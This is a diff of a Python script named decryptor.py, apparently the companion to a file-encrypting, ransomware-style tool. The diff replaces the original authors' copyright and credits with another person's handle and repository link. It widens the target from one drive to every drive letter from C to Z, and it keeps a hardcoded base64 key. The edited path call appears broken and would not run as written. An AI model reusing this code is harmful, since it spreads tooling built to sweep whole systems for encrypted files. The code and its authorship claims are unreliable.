@@ -3,7 +3,7 @@
 #
 #  decryptor.py
 #  
-#  Copyright 2018 bingo <bingo@hacklab>
+#  Copyright 2018 
 #  
 #  This program is free software; you can redistribute it and/or modify
 #  it under the terms of the GNU General Public License as published by
@@ -42,7 +42,7 @@ print(red+"""
 \t    )                                           (
 \t    \ \                                       / /
 \t     \ |\                                   / |/
-\t      \|  \           hack1lab            /   /
+\t      \|  \                               /   /
 \t       \   |\         --------          / |  /
 \t        \  |  \_______________________/   | /
 \t         \ |    |      |      |      |    |/
@@ -51,8 +51,8 @@ print(red+"""
 
 
 
-\t             By: @hack1lab, @mohamed1lar
-\t          fb.me/hack1lab, fb.me/mohamed1lar
+\t             By: @ly88321
+\t          https://github.com/ly88321/crypt0
 
 """+end)
 
@@ -94,7 +94,29 @@ def decrypt(key, filename):
 list_f = []
 
 
-p = Path('E:\\')
+p = path('C:\\',
+         'D:\\',
+         'E:\\',
+         'F:\\',
+         'G:\\',
+         'I:\\',
+         'J:\\',
+         'K:\\',
+         'L:\\',
+         'M:\\',
+         'N:\\',
+         'O:\\',
+         'P:\\',
+         'Q:\\',
+         'R:\\',
+         'S:\\',
+         'T:\\',
+         'U:\\',
+         'V:\\',
+         'W:\\',
+         'X:\\',
+         'Y:\\',
+         'Z:\\')
 key = "aGFja2xhYg=="
 
 try:
